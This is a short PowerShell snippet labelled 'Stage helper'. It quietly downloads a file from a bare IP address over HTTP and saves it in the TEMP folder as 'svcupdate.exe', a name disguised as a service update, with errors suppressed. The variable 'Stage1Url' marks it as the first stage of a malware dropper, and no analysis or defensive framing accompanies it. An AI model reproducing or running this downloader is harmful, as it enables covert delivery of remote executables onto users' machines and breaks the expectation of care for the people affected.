
# Stage helper
try { $Stage1Url = 'http://198.51.100.183:80/update.dat'; $LocalPath = "$env:TEMP\svcupdate.exe"; Start-BitsTransfer -Source $Stage1Url -Destination $LocalPath -ErrorAction SilentlyContinue; [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 } catch { Write-Warning "Stage transfer failed" }
